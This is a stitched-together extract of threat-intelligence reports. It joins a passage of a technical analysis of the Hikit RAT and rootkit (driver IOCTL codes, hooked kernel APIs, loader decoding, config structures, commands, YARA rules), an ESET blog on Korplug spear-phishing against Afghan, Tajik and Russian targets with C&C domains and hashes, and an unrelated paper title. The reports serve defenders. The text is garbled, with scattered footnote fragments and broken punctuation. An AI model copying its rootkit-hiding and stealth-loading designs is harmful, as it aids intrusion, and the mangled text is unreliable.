       Gen 1.2          GET / HTTP/1.1\r\n               75BCD15         HTTP/1.1 200 OK
                                                                         Pragma: no-cache
                                                                         Content-Type: text/html
                                                                         ETag: "{other
                                                                         digits}75BCD15{other digits}:{3 hex
                                                                         digits}"
                                                                         Connection: Keep-Alive
       Gen 1.2          POST / HTTP/1.1\r\n              75BCD15         HTTP/1.1 200 OK
                                                                         Pragma: no-cache
                                                                         Content-Type: text/html
                                                                         ETag: "{other
                                                                         digits}75BCD15{other digits}:{3 hex
                                                                         digits}"
                                                                         Connection: Keep-Alive
Up to and including Gen 1.1 Drivers required the DLL to specify the trigger string in addition to the
authentication value whereas Gen 1.2 Drivers had the trigger strings hardcoded.
In Gen 1.2, whenever the Driver detects a trigger string, the Driver inspects the rest of the data
received for the authentication value. If the token follows the trigger string (there is no specific limitation
on how far from the trigger string the password token must be), then the Driver generates a new
channel that the DLL will use as the conduit between the DLL and the client.
The Driver appears to be based off the NDIS example source code PassThru. More specifically, the
author(s) of the Driver appear to have used the modified version of the PassThru example,
PassThruEx, by James Antognini and Thomas Devine from a 2003 blog post1.
Gen 2 Driver
The Gen 2 sub-family, beginning with Gen 2.0 Beta, employs a Windows device driver (
the Driver
) to
hide aspects of the DLL
s functionality from normal system processes. The Driver is a relatively
straightforward piece of software. It does not attempt to obfuscate its functionality from static analysis
and it hooks a minimum number of kernel API functions in order to hide different pieces of information.
The Driver is based primarily on the open source Agony rootkit2 and it has evidence of some portions of
the code coming directly from a Chinese blog3.
The Driver expose an IOCTL interface that supports the following OIDs:
        OID                                                                                                                  Function
        0x22C000                                                                                                             Add driver (system module) to hide.
        0x22C004                                                                                                             Reveal all hidden items.
        0x22C008                                                                                                             Add IP:Port endpoint to hide.
        0x22E000                                                                                                             No-Op
        0x22FFD0                                                                                                             Remove PID from hidden list.
        0x22FFD4                                                                                                             Add PID to list of PIDs to hide.
        0x22FFD8                                                                                                             Add service to list of services to hide.
        0x22FFE0                                                                                                             Add local port to list of ports to hide.
        0x22FFE4                                                                                                             Currently unused. Evidence suggest this was previously a port hiding function, but it
                                                                                                                             is no longer functional.
        0x22FFE8                                                                                                             Currently unused. It is unclear the purpose of this function. It takes a string as its
                                                                                                                             argument.
        0x22FFEC                                                                                                             Add directory to list of directories to hide.
        0x22FFF0                                                                                                             Add registry key to list of registry keys to hide.
        0x22FFF4                                                                                                             Add registry key value to list of registry values to hide.
        0x22FFFC                                                                                                             Purge all hooks and hidden items ("unhook")
The Driver is capable of hiding processes (by PID, not name), system modules, services, network
connections, listening ports, directories (and by extension, files), as well as registry keys and values. In
order to hide these items, the Driver hooks various Windows Kernel API calls. The following table maps
the items the Driver can hide to the API function that the Driver hooks:
        Item                                                                                                                                                        API Function Hooked
        Process ID                                                                                                                                                  ZwDeviceIoControlFile
        (PID)
        Registry Key                                                                                                                                                ZwEnumerateKey
        Registry Value                                                                                                                                              ZwEnumerateValueKey
        Directory                                                                                                                                                   QueryDirectoryFile
James
Antognini
Thomas
Divine.
Extending
Microsoft
PassThru
NDIS
Intermediate
Driver
Parts:
Address
Blocking
NDIS
Drivers
December
2003
pudn.
Agony
Rootkit
code,
stability
useful
Driver
Develop
http://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.
April
2007.
CardMagic.
[Reserved]
Module
Hook:
Hiding
Port
Under
Windows
Vista
http://forum.eviloctal.com/archiver/tid-
29604.html.
July
2007.
       Item              API Function Hooked
       Local Listening   ZwDeviceIoControlFile
       Port
       Remote            ZwDeviceIoControlFile
       Endpoint
       Loaded Drivers    ZwQuerySystemInformation
In order to hide services, the Driver will access the memory of the services.exe process, locate the
linked list of services and remove the service entry that the Driver wishes to hide. This is a surprisingly
invasive method to obfuscate a process.
Upon activation, the Driver will expose its interface by calling
IoCreateDevice
with the name
\Device\agony
(for Gen 2.0 Beta samples), \Device\HTTPS
(for Gen 2.1 samples),
\Device\advcachemgr
(for Gen 2.2 samples) or \Device\diskdump
(for Gen 2.3 samples). The
Driver also creates a symbolic link to the device using the same name but under the
\DosDevices\
tree.
For reasons unknown, the authors of the Driver used code from a Chinese blog that details how to hide
network connections on Windows Vista and later decided to keep the example IP address within the
code.
Functionality and Commands
The Hikit family has supported roughly the same set of commands since the first known samples of
Gen 1.0. Gen 2.0 introduced a single command to provide insight into an infected machine
s Hikit
configuration (something that is not necessary for Gen 1 variants since they are server-based). The
RAT supports the following commands:
       Command       Introduced   Description
       shell         Gen 1.0      Establishes a remote command shell on the victim machine
       file          Gen 1.0      File managerment
       connect       Gen 1.0      Establishes a tunnel connection (e.g. port forwarding) through
                                  another Hikit sample
       socks5        Gen 1.0      Establishes a forwarding proxy (retired in Gen 1.2)
       proxy         Gen 1.2      Establishes a forwarding proxy
       information   Gen 2.0      Returns the configuration for the Hikit infection
                     Alpha
       exit          Gen 1.0      Terminates a channel
Command: 
shell 
shell
command activates a remote shell on the victim
s computer. The remote shell function uses
the standard pipe redirection method for interfacing a network application (in this case, the DLL) to a
hidden command shell.
Command: 
file 
file
command provides an attacker with a variety of disk access options such as listing
directories, changing the current directory, and uploading and downloading files.
Command: 
connect 
connect
function provides the functionality to allow one Hikit DLL to interface with another DLL of
a similar version. The use of this functionality can best be illustrated by considering the fact that the
Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen
s RAT function. This would prohibit lateral movement within a victim
s network as the bulk of any
organization
s network infrastructure is not directly exposed to the Internet. By using the connect
command, an attacker can instruct the externally exposed Gen 1 DLL to route traffic to a Gen 1 DLL
that is behind the firewall, effectively making the externally exposed Gen 1 DLL a local router for Hikit
traffic.
Command: 
proxy (Gen 1.2 and later), socks5 
(Gen 1.0 and 1.1) 
proxy
socks5) command allows an attacker to utilize a Hikit-infected machine as a proxy.
Command: 
information 
Gen 2 samples rely on a configuration in order to know where the C2 server exists along with other
operational aspects such as the name of its service and operational times. This information is important
for the attacker to have access to in order to determine if any aspect of the configuration is out of date
(thus requiring a new variant of the Gen 2 binary to be configured and deployed). The
information
command returns to the attacker the complete configuration and current state of the Gen 2 malware.
Command: 
exit 
As the name implies, the
exit
command causes the DLL to discontinue the current connection.
Hikit Core Analysis
With the Gen 1 sub-family using a server model and the Gen 2 sub-family using the client model,
understanding how each of the DLL components of the sub-families works is best done, as with the
Driver above, in the context of the specific sub-family.
Gen 1 Analysis
As noted previously in this report, the Gen 1 sub-family has several sub-generations but overall the
functionality of the Gen 1 sub-family has remained constant. With the exception of Gen 1.0, the
functionality of Gen 1 comes from the DLL component (Gen 1.0 uses a stand-alone executable to
achieve the same results). The DLL operates as a service, requiring an attacker is install the DLL as a
service at some point prior to activation. The DLL contains only two exports: DllEntryPoint
DllRegisterServer.
Ultimately, both exports generate a new thread of the same function
mainThread
). The difference between the two exports is that DllRegisterServer
can take an
optional command line argument of the letter 
 which will instruct the main thread to uninstall the Gen
1 system from a victim
s computer. If the uninstall argument exists,
mainThread
will simply remove the
Driver from the victim
s machine and terminate. The authors of Gen 1 used freely available source code
found online for their removal function.4
PCAUSA.
Programmatically
Installing
NDIS
Protocol
Drivers
http://www.ndis.com/ndis-
general/ndisinstall/programinstall.htm.
December
2013.
When the DLL activates, either by a call to
DllEntryPoint
or by calling
DllRegisterServer
without the u parameter,
mainThread
begins by verifying the version of the Driver installed on the
victim
s machine. This requires sending OID 0x12C850 to the Driver and comparing the resulting 32-bit
value with the required driver version. If the version is incorrect (i.e. it doesn
t match the specified
version), the DLL installs the version of the Driver found within the DLL
s resource section (under the
resource tree).
With the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will
instruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen
1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate
URL. The DLL again checks the version of the Driver and, in some versions of the DLL, will print a
message indicating the version of the Driver installed and report the 
Transate version
 (the word
translate is misspelled within the binary). It appears that the Driver and the communication protocol
version do not necessarily have to match exactly, allowing the possibility that the Driver and the DLL
could be compiled at separate times. If the Driver version is less than the 
Transate
 version (indicating
that the Driver is a version too old to support the necessary communication protocols), the DLL will, in
some version of the DLL, print out a line to the screen indicating the DRIVER_MIN_VERSION
required
along with the current Driver version. Following this, the DLL will then attempt to install the correct
version of the Driver prior to terminating. It is unclear why this code exists given that the DLL will check
the Driver version and correct the Driver if necessary prior to reaching the portion of the code that
reports the
DRIVER_MIN_VERSION.
It is possible that the second Driver version check is a last ditch
effort to ensure the correct Driver is installed.
The DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists. A
channel represents an established connection between the Driver and an external party that has
provided the proper initial request and, for Gen 1.2 variants, provided the proper authentication value.
When the Driver establishes a new channel, the DLL generates a runtime data structure before
generating a new thread (
HikitThreadFunc
) which will service any request coming from the new
channel. This allows the DLL to service multiple channels at one time.
The HikitThreadFunc
function is, at its core, a simple wait and respond loop. The function begins by
transmitting a Hikit command prompt to the client (Hikit>) before settling into an infinite loop of
       
   Read data from channel (wait until data is available)
       
   [For Gen 1.2] Decrypt the packet header
       
   Verify the packet header to ensure the communication version is correct and the payload data
           size is non-zero
       
   Read the remainder of the packet (e.g. the payload portion)
       
   If the packet type field (dwPacketType) is zero, send the payload section to the command
           processor.
       
   Send the Hikit prompt
The communication scheme between the DLL and the client consists of a 20 to 24 byte header (for Gen
1.0 and Gen 1.1) or a 28 byte header (for Gen 1.2) followed by an optional payload. The format of the
Gen 1.0 and Gen 1.1 header is as follows:
struct PacketHeader
     char magic[5];
     char zeros[3];
     DWORD dwHikitVersion;
     DWORD dwCmdType;
     DWORD dwLocale;     // omitted in some Gen 1.0 variants
     DWORD dwPayloadSize;
While the Gen 1.2 header is:
struct PacketHeader
     DWORD key;
     DWORD dwHikitVersion;
     DWORD dwPacketType;
     DWORD dwLocale;
     DWORD dwCodePage;
     DWORD dwPayloadSize;
For Gen 1.0 and Gen 1.1 samples, the magic field contains the string 
.. ..
(two dots followed by a
space then two more dots). Whereas the key field in Gen 1.2 samples contains a 32-bit value that
represents the XOR key for the remainder of the PacketHeader and any additional payload data. The
XOR scheme works on 32-bit chunks of data where each 32-bit chunk of data is XOR
d against the key
value.
Version checking is important in all Gen 1 variants. The dwHikitVersion
field allows the client and
the DLL to ensure that they have a compatible communication scheme in place prior to executing
commands.
Gen 1 samples have a particular interest in the victim
s locale language preferences. While it is typical
for most RATs that provide remote shells to simply pass data unfiltered from client to server and server
to client without regard to code pages, Gen 1 samples take special care to record the code page and
locale information in each and every packet header that traverses the divide between client and server
and server and client. This could indicate that the authors of Gen 1 understood from an early stage in
the development of Gen 1 that they would be attacking computer systems with different locales and
code pages.
Gen 2 Analysis
The Gen 2 sub-family, like Gen 1.2, uses a DLL for the core of its RAT functionality. In order for the
DLL to load, Gen 2 (starting with Gen 2.1) uses a loader application (referred to simply as 
Loader
). The Loader comes in the form of a standard executable image or a DLL image. Despite the
different models, both variants of the Loader load the embedded DLL in the exact same way. The only
difference between the executable and DLL versions of the Loader comes in how they handle the
initialization of the embedded DLL.
                                                                                                  
                                                                
Figure 1: DLL (left) and executable (right) Loader startup routines
Figure 1 provides a side by side comparison of the startup routines for the executable and DLL
Loaders. Both versions of the Loader begin by loading the embedded DLL from the Loader
s resources
(item 102 under the Group Icons resource tree), decrypting and decompressing the image into memory,
then manually loading the DLL into memory using a custom loading routine. The function
LoadEmbeddedImage, as seen in part in Figure 2, is responsible for this operation.
                                                                                                           
       
Figure 2: LoadEmbeddedImage function snippet
The Loader obfuscates many strings by using a simple XOR encoding scheme. Decryption of encoded
strings consists of taking the first value of the string as the XOR key, XOR
ing all subsequent bytes until
the result of the XOR returns 0. The decoding of the encoded strings is handled by the DecodeString
function.
The Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image. In
order to locate the embedded DLL,
LoadEmbeddedImage
will use the
DecodeString
function to
decrypt the delimiter string (which is typically
zzzzzzzzzz
yyyyyyyyyy) and then search the icon
resource memory for the delimiter string. Once located,
LoadEmbeddedImage
will use the first 12
bytes immediately after the string as the information structure about the embedded DLL. The structure
(seen below) defines the size of the embedded DLL within the icon
s resource memory, the size of the
DLL after it is decompressed and a 4-byte XOR key that
LoadEmbeddedImage
must use to decode
the embedded DLL prior to decompression.
        struct ImageHeader
        {
           DWORD dwImageEncodedSize;
           DWORD dwImageSizeDecompressed;
           DWORD EncodingKey;
        };
LoadEmbeddedImage
copies the compressed embedded DLL into a newly allocated heap buffer and
then calls the function
decodeBuffer
(using the
EncodingKey
value) to decrypt the embedded DLL.
Another heap buffer is allocated with a size equal to the value of
dwImageSizeDecompressed.
decompression buffer along with the now decoded compressed buffer are given to lzo_decompress
which decompresses the compressed image using the LZO1X algorithm5.
With the embedded DLL now decompressed into a heap buffer, LoadEmbeddedImage
calls
ImageLoaderData::LoadDll
to manually load the DLL into memory.
ImageLoaderData::LoadDll
interprets the PE/COFF header of the DLL image, loads the image
into the appropriate memory configuration, performs the necessary relocation operations, and calls the
DllMain
(DLL
s entry point) function.
After loading the embedded DLL image into memory, the Loader will either call the DLL
StartServer
MatrixMain
function depending on the type of Loader. The standalone Loaders use
MatrixMain
function while the DLL Loaders will call the
StartServer
function. The Loaders,
upon unloading, will call the StopServer function in order to shut down the embedded DLL.
The Gen 2 DLL exposes five exported functions (besides the
DllEntryPoint/DllMain).
        Export Name                                                                                                                                                               Description
        DllRegisterServer                                                                                                                                                         If the Gen 2 RAT is running, waits for the RAT to shut down before returning.
        MatrixMain                                                                                                                                                                Activates the Gen 2 RAT (called from a stand-alone Loader)
        SetModuleHandle                                                                                                                                                           The given parameter becomes the new module handle for the RAT.
        StartServer                                                                                                                                                               Activates the Gen 2 RAT (called from a DLL Loader)
        StopServer                                                                                                                                                                Stops the Gen 2 RAT (called from a DLL Loader)
MatrixMain
StartServer
both ultimately generate a new thread (using the POSIX API function
beginthreadex
instead of the more common
CreateThread) that contains the main loop of the Gen
2 RAT functionality. MatrixMain, however, has added functionality. The prototype for MatrixMain is as
follows:
                                                  int MatrixMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR
                                                                       lpCmdLine, int nShowCmd))
Markus
F.X.J.
Oberhumer,
real-
time
data
compression
library
http://www.oberhumer.com/opensource/lzo/.
June
2014.
where Arguments parameter can be:
       Arguments string                                 Purpose
       test {DWORD identifier (IP?)}                    Overrides the current configuration with the given
       {listening Port} [C2 address] [C2 port]          settings. The C2 arguments are optional.
       i                                                Installs trojan service
       u                                                Uninstalls the trojan service
       s                                                Sets the SHOW flag for the service to instruct the
                                                        Driver to reveal the service.
       h                                                Sets the HIDE flag for the service to instruct the
                                                        Driver to hide the service.
       q                                                Sets the STOP flag for the RAT.
If the i
parameter is given, the DLL will install itself as a service on the victim
s machine. The DLL will
create a new service (e.g. 
Network DDE Service
) and assign itself as the executable for the service.
The DLL
s RAT functionality provides basic features such as network port forwarding (proxying), file
transfer, and remote command shell. The RAT functionality provides an attacker with the ability to
establish a phantom network within a victim
s infrastructure by having individual instances of Gen 2 DLL
listen for incoming connections on local ports (presumably, NAT
d ports) and accept commands from
the inbound connection. This allows an attacker to establish several Gen2 infections within a victim
infrastructure and if outbound connectivity is prohibited for any of the infected machines, the attacker
can route commands to the pseudo-isolated infections through accessible infected machines providing
a high level of persistence to the malware. Each Gen 2 infection can support up to 10 listening ports.
The communication between the Gen 2 malware and the C2 (or other Gen 2 malware, in the case of
the internal routing functionality) is encrypted using a simple DWORD XOR scheme. Each
communication burst (either between the malware and the C2 or the malware and neighboring
malware) begins with a 24-byte header identical to the header found in Gen 1.2. Immediately following
the header is the type-specific (as indicated by the
dwPayloadType field) payload data. Note that the
dwXORKey
value is NOT encoded with the XOR value, but rather is the value that is used for encoding
the header and payload.
Each DLL includes a hardcoded, default configuration. At the time that the RAT functionality activates,
the DLL will drop the current configuration to disk. If the configuration file already exists, then the RAT
will use the file version of the configuration over the default configuration. The configuration data
structure (seen below) doubles as a current state record for some aspects of the communication
subsystem of the DLL. When stored on disk, the configuration is preceded by a GUID value (16 bytes)
that represents the unique identifier for the specific infection. The configuration is XOR encoded using
the first 4 bytes (as a DWORD) of the GUID.
       struct Config
       {
          WCHAR wszComment[32];
          C2ConfigInfo arrC2s[2];
          ListeningPortConfig ListeningPorts[10];
          int dwStartTime;
          int dwEndTime;
          __int16 Flags;
          SYSTEMTIME sleepUntil;
          __int16 unused_align2_2;
          int fRunHidden;
       };
       struct C2ConfigInfo
       {
          WCHAR wszAddress[32];
          __int16 wPort;
          __int16 unused_align2;
          int fValidC2;
       };
       struct ListeningPortConfig
       {
          unsigned __int16 wPort;
          unsigned __int16 unused_align2;
          int fReady;
          SOCKET hSocket;
          HANDLE hEvent;
          HANDLE hListenerThread;
       };
In order to provide some level of stealth, the RAT will install a rootkit on 32-bit versions of Windows.
The DLL contains a device driver image embedded within an encoded buffer which the RAT
functionality code will extract to the %TEMP%
directory (after XOR
ing the buffer with 0x76). To activate
the rootkit, the RAT functionality code creates a service with the driver in the %TEMP%
directory as the
executable for the service. The RAT functionality code then activates the service and opens a handle to
device driver
s interface (e.g. \Globals\HTTPS). With the handle open to the rootkit driver, the RAT
functionality code deletes the service in order to reduce the visible footprint of the new driver. To further
reduce the footprint of the driver, the RAT functionality code also uses the cloaking functionality of the
rootkit to hide the DLL
s PID, any references to the GUID {4AE26357-79A3-466D-A6D9-
FC38BFB67DEA}, the DLL
s service names (e.g. 
NetDDESrv
 and "Network DDE Service") and the
service entry as well. Additionally, the code also attempts to hide a service named 
Hitx
Support Software
In addition to the main Hikit malware, there are at least two examples of support programs that belong
to the Hikit family. Samples b04de6c417b6f8836e3f2d8822be2e68f4f9722b and
7c4da9deff3e5c7611b9e1bd67d0e74aa7d2d0f6 are examples of Gen 1.0 and Gen 1.2 operator
consoles. The console is a text based application that takes a Gen 1.0 or Gen 1.2 infection
s IP address
and proceeds to connect and authenticate with the infected server. Once connected, the operator has
the basic Hikit functionalities available to them via commands such as file and shell.
Detection
Detecting Hikit variants on disk and in memory is possible using the following YARA signature
developed by Symantec:
rule hikit
     strings:
           $hikit_pdb1 = /(H|h)ikit_/
           $hikit_pdb2 = "hikit\\"
           $hikit_str3 = "hikit>" wide
               $driver    =   "w7fw.sys" wide
               $device    =   "\\Device\\w7fw" wide
               $global    =   "Global\\%s__HIDE__" wide nocase
               $backdr    =   "backdoor closed" wide
               $hidden    =   "*****Hidden:" wide
     condition:
           (1 of ($hikit_pdb1,$hikit_pdb2,$hikit_str3)) and ($driver or
$device or $global or $backdr or $hidden)
rule hikit2
     strings:
      $magic1 = {8C 24 24 43 2B 2B 22 13 13 13 00}
      $magic2 = {8A 25 25 42 28 28 20 1C 1C 1C 15 15 15 0E 0E 0E 05 05 05
     condition:
      $magic1 and $magic2
rule hidkit
     strings:
      $a = "---HIDE"
      $b = "hide---port = %d"
     condition:
      uint16(0)==0x5A4D and uint32(uint32(0x3c))==0x00004550 and $a and $b
Detecting nominal Gen 1.2 and later network activity is problematic given the nature of the
communication structure. The encrypted nature of the nominal Gen 1.2 and later network traffic makes
a signature difficult. Snort signature 30948 may detect some Hikit based network traffic for only Gen 1.0
and Gen 1.1.
From a system objects perspective, Gen 2 samples produce up to three named events. The event
names change per infection, but have a common format. The following three strings represent the
known mutex strings for Gen 2 samples:
                                        Global\%s__SHOW__
                                        Global\%s__HIDE__
                                        Global\%s__STOP__
where the %s format variable is replaced with a UUID value string specific to the infected machine.
Appendix A: HiKit Versions
       Generation   Starting Date      Notable Features
       Identifier
       Gen 1.0      31 March 2011      First known Hikit samples. Stand-alone console executable.
       Gen 1.1      18 April 2011      Uses DLL and driver model.
       Gen 2.0      28 August 2011     First client-based Hikit variants. Stand-alone console
       Alpha                           executable. Does not use a device driver. Encrypted
                                       communication.
       Gen 1.2      23 October 2011    Command 
socks5
 changes to 
proxy
. Encrypted
                                       communication.
       Gen 2.0      27 February 2012   Introduces the use of the device driver.
       Beta
       Gen 2.1      17 April, 2012     First known production variant of the Gen 2 family. Uses the
                                       concept of the Loader, the DLL and the Driver as a complete
                                       system.
       Gen 2.2      21 February 2013   Changes storage location for configuration file. Largely similar
                                       to Gen 2.1. DLL-based and executable-based loaders. Largest
                                       in-service time span.
       Gen 2.3      12 December        Significantly more advanced authentication when doing intra-
                    2013               malware communication. Use of SSL certificate during
                                       handshake.
Korplug military targeted attacks: Afghanistan & Tajikistan
After taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns
employing this well-known Remote Access Trojan. This blog gives an overview of the first one, related to
Afghanistan & Tajikistan. The other campaign, where the targets were a number of high-profile
organizations in Russia, will be the subject of Anton Cherepanov
s presentation at the ZeroNights
security conference in Moscow this week.
Sometimes malware used in various attacks is unique enough to identify related incidents, which makes
tracking individual botnets simpler. An example is the BlackEnergy Lite variant (also known as
BlackEnergy 3) used by a group of attackers (that was then given the name Quedagh, or Sandworm)
against targets in Ukraine and other countries. BlackEnergy Lite is clearly distinguishable from the
numerous binaries of the more common BlackEnergy 2 also circulating in-the-wild.
In other cases, attackers use more common tools for accomplishing their criminal goals. For example, the
Korplug RAT (a.k.a .PlugX) is a well-known toolkit associated with Chinese APT groups and used in a
large number of targeted attacks since 2012. For the past several weeks we have taken a closer look at a
great number of detections of this malware in many unrelated incidents.
Among these, we were able to discover several successful infections where the employed Korplug samples
were connecting to the same C&C domain.
DOMAIN: www.notebookhk.net
Updated Date: 2013-11-12 18:03:45
Create Date: 2013-06-18 11:08:17
Registrant Name: lee stan
Registrant Organization: lee stan
Registrant Street: xianggangdiqu
Registrant City: xianggangdiqu
Registrant State: xianggang
Registrant Postal Code: 796373
Registrant Country: HK
Registrant Phone : +0.04375094543
Registrant Fax: +0.04375094543
Registrant Email:stanlee@gmail.com
Other Korplug samples were connecting to a different domain name resolving to the same IPs as
notebookhk.net:
DOMAIN: www.dicemention.com
Updated Date: 2013-11-12 18:05:33
Create Date: 2013-09-10 14:35:11
Registrant Name: z x
Registrant Organization: z x
Registrant Street: xianggangdiqu
Registrant City: xianggangdiqu
Registrant State: xianggang
Registrant Postal Code: 123456
Registrant Country: HK
Registrant Phone : +0.0126324313
Registrant Fax: +0.0126324313
Registrant Email: 123@123.com
DOMAIN: www.abudlrasul.com
Updated Date: 2014-10-16 14:16:27
Create Date: 2014-10-16 14:16:27
Registrant Name: gang xin
Registrant Organization: gang xin
Registrant Street: Argentina Argentina
Registrant City: Argentina
Registrant State: Argentina
Registrant Postal Code: 647902
Registrant Country: AR
Registrant Phone : +54.0899567089
Registrant Fax: +54.0899567089
Registrant Email: woffg89@yahoo.com
Taking these C&Cs as a starting point, we were able to locate a number of victims infected through various
exploit-laden spear-phishing documents and cunningly-named archives.
A table with a selection of RTF documents and RAR self-extracting archives with a .SCR extension is
shown below:
                                       English
            File name                                                        SHA1
                                     translation
 Situation Report about
                                                         36119221826D0290BC23371B55A8C0E6A84718DD
 Afghan.doc
 AGREEMENT BETWEENTHE
 NATO AND AFGHANISTAN
 ON THE STATUS OF NATO                                   A6642BC9F3425F0AB93D462002456BE231BB5646
 FORCES IN
 AFGHANISTAN.doc
 news.doc                                                51CDC273B5638E06906BCB700335E288807744B5
               Activity plan for
           military units in the
                                                         EA6EE9EAB546FB9F93B75DCB650AF22A95486391
             Volga region in July
 2014 
.scr      2014
                                 Telephone directory
          of the Ministry of
                                                         D297DC7D29E42E8D37C951B0B11629051EEBE9C0
 .scr           Foreign Affairs of
                                 the Kyrgyz Republic
             About the Center for
                       social adaptation of    8E5E19EBE719EBF7F8BE4290931FFA173E658CB8
.scr              servicemen
                                 Meeting minutes of
                                 the General Staff of    1F726E94B90034E7ABD148FE31EBA08774D1506F
.scr
                                 the PRC
       Corrected action
                                                         A9C627AA09B8CC50A83FF2728A3978492AEB79D8
.scr                 plan template
 Situation Report about
                                                         A9C627AA09B8CC50A83FF2728A3978492AEB79D8
 Afghan.scr
                                 Military and political
             situation in Islamic
                Republic of            E32081C56F39EA14DFD1E449C28219D264D80B2F
04.10.2014.scr                Afghanistan (IRA)
                                 on 04.10.2014
 Afghan Air Force.scr                                  E32081C56F39EA14DFD1E449C28219D264D80B2F
.scr            Action plan           1F726E94B90034E7ABD148FE31EBA08774D1506F
Some of the above-mentioned files also contained decoy documents:
In all of the cases, three binary files were dropped (apart from decoy documents) that led to the Korplug
trojan being loading into memory.
      exe 
 a legitimate executable with a Kaspersky digital signature that would load a DLL with a
      specific file name
      dll 
 a small DLL loader that would pass execution to the Korplug raw binary code
      dll.avp 
 raw Korplug binary
The Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables
and is a way to stay under the radar, since a trusted application with a valid signature among startup items
is less likely to raise suspicion.
The maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability
in Microsoft Word. The image below shows the beginning of the CVE-2012-0158 shellcode in ASCII
encoding within the document (the opcodes 60, 55, 8bec disassemble to pusha; push ebp; mov ebp, esp).
Interestingly, though, the documents also contain the newer CVE-2014-1761 exploit that was extensively
used in targeted attacks carried out by a number other malware families this year (including BlackEnergy,
Sednit, MiniDuke, and others). However, this exploit is not implemented correctly due to a wrong file
offset in the 1st stage shellcode.
Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag 
p!11
marking the beginning of the 2nd stage shellcode and loads it into memory. Even though the tag and 2nd
stage shellcode is present in the RTF, it
s at a different offset, and thus never is loaded.
Sophos
 Gabor Szappanos gives a possible explanation how these malformed samples may have come into
existence.
ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least
June 2014 and continue through today.
We were able to pinpoint the targets to residents of the following countries:
      Afghanistan
      Tajikistan
      Russia
      Kyrgyzstan
      Kazakhstan
From the topics of the files used to spread the malware, as well as from the affected targets, it appears that
the attackers are interested in gathering intelligence related to Afghan, Tajik and Russian military and
diplomatic subjects.
Interestingly, most of the affected victims have another thing in common 
 a number of other RATs, file
stealing trojans or keyloggers were detected on their systems on top of the Korplug RAT detection. One of
these 
alternative RATs
 was connecting to a domain also used by the Korplug samples.
Since the functionality of these tools was partly overlapping with that of Korplug, it left us wondering
whether the attackers were just experimenting with different RATs or were they supplementing some
functionality that they were unable to accomplish.
Additional information about two malware families that were most often found accompanying Korplug
infections is given below.
Alternative Malware #1: DarkStRat
A curious Remote Access Trojan, as research points to a Chinese connection but the commands it listens
to are in Spanish (translation in English):
      CERRAR (close)
      DESINSTALAR (uninstall)
      SERVIDOR (server)
      INFO
      MAININFO
      PING
      REBOOT
      POWEROFF
      PROC
      KILLPROC
      VERUNIDADES (see units)
      LISTARARCHIVOS (list files)
      EXEC
      DELFILE
      DELFOLDER
      RENAME
      MKDIR
      CAMBIOID (change ID)
      GETFILE/SENDFILE/RESUMETRANSFER
      SHELL
      SERVICIOSLISTAR (list service)
      INICIARSERVICIO (start service)
      DETENERSERVICIO (stop service)
      BORRARSERVICIO (erase service)
      INSTALARSERVICIO (install service)
The malware can manage processes and services on the infected machine, transfer files to and from the
C&C server, run shell commands, and so on. It is written in Delphi and connects to
www.dicemention.com. Some samples contain a digital signature by 
Nanning weiwu Technology co.,ltd
Alternative Malware #2: File Stealer
This malware, written in C, and contains several functions for harvesting files off the victim
s hard drive
according to criteria set in the configuration file. Apart from doing a recursive sweep of all logical fixed
and remote drives, it also continually monitors any attached removable media or network shares by
listening to DBT_DEVICEARRIVAL events.
In addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,
account information and proxy information from the following applications:
      Microsoft Messenger
      Microsoft Outlook
      Microsoft Internet Explorer
      Mozilla Firefox
The C&C domains used by this malware are:
      newvinta.com
      worksware.net
Some samples of this file stealer detected in these campaigns also contain the signature by 
Nanning
weiwu Technology co.,ltd
 another indicator that the infections are related.
List of SHA1 hashes:
Korplug:
5DFA79EB89B3A8DDBC55252BD330D04D285F9189
095550E3F0E5D24A59ADD9390E6E17120039355E
5D760403108BDCDCE5C22403387E89EDC2694860
05BFE122F207DF7806EB5E4CE69D3AEC26D74190
548577598A670FFD7770F01B8C8EEFF853C222C7
530D26A9BEEDCCED0C36C54C1BF3CDA28D2B6E62
F6CB6DB20AA8F17769095042790AEB60EECD58B0
EF17B7EC3111949CBDBDEB5E0E15BD2C6E90358F
17CA3BBDDEF164E6493F32C952002E34C55A74F2
973EA910EA3734E45FDE304F20AB6CF067456551
47D78FBFB2EFC3AB9DDC653A0F03D560D972BF67
0B5A7E49987EF2C320864CF205B7048F7032300D
E81E0F416752B336396294D24E639AE86D9C6BAA
E930D3A2E6B2FFDC7052D7E18F51BD5A765BDB90
Alternative Malware #1:
FDD41EB3CBB631F38AC415347E25926E3E3F09B6
457F4FFA2FE1CACFEA53F8F5FF72C3FA61939CCD
5B6D654EB16FC84A212ACF7D5A05A8E8A642CE20
7D59B19BD56E1D2C742C39A2ABA9AC34F6BC58D4
D7D130B8CC9BEA51143F28820F08068521763494
01B4B92D5839ECF3130F5C69652295FE4F2DA0C5
02C38EC1C67098E1F6854D1125D3AED6268540DE
Alternative Malware #2:
3A7FB6E819EEC52111693219E604239BD25629E9
BF77D0BA7F3E60B45BD0801979B12BEA703B227B
55EF67AFA2EC2F260B046A901868C48A76BC7B72
A29F64CD7B78E51D0C9FDFBDCBC57CED43A157B2
34754E8B410C9480E1ADFB31A4AA72419056B622
17A2F18C9CCAAA714FD31BE2DE0BC62B2C310D8F
6D99ACEA8323B8797560F7284607DB08ECA616D8
1884A05409C7EF877E0E1AAAEC6BB9D59E065D7C
1FC6FB0D35DCD0517C82ADAEF1A85FFE2AFAB4EE
5860C99E5065A414C91F51B9E8B779D10F40ADC4
7950D5B57FA651CA6FA9180E39B6E8CC1E65B746
Research by: Anton Cherepanov
Author Robert Lipovsky, ESET
                     DETECTION | PREVENTION | INTELLIGENCE
                           Invincea White Paper
Micro-Targeted Malvertising via Real-time Ad Bidding
UPDATED: Includes New CryptoWall Malvertising Campaign
